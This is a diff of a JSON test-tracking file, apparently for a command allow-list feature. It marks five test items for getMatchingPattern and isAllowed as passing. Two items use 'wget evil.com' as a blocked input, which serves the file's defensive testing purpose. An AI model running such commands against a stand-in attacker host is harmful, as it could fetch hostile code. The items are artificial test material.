@@ -6,7 +6,7 @@
       "Call getMatchingPattern('echo hello', ['echo'])",
       "Expect return value to equal 'echo'"
     ],
-    "passes": false
+    "passes": true
   },
   {
     "id": "0001",
@@ -15,7 +15,7 @@
       "Call getMatchingPattern('git status --short', ['git status'])",
       "Expect return value to equal 'git status'"
     ],
-    "passes": false
+    "passes": true
   },
   {
     "id": "0001",
@@ -24,7 +24,7 @@
       "Call getMatchingPattern('wget evil.com', ['echo'])",
       "Expect return value to equal null"
     ],
-    "passes": false
+    "passes": true
   },
   {
     "id": "0001",
@@ -33,7 +33,7 @@
       "Call isAllowed('echo hello', ['echo'])",
       "Expect return value to be true"
     ],
-    "passes": false
+    "passes": true
   },
   {
     "id": "0001",
@@ -42,7 +42,7 @@
       "Call isAllowed('wget evil.com', ['echo'])",
       "Expect return value to be false"
     ],
-    "passes": false
+    "passes": true
   },
   {
     "id": "0002",
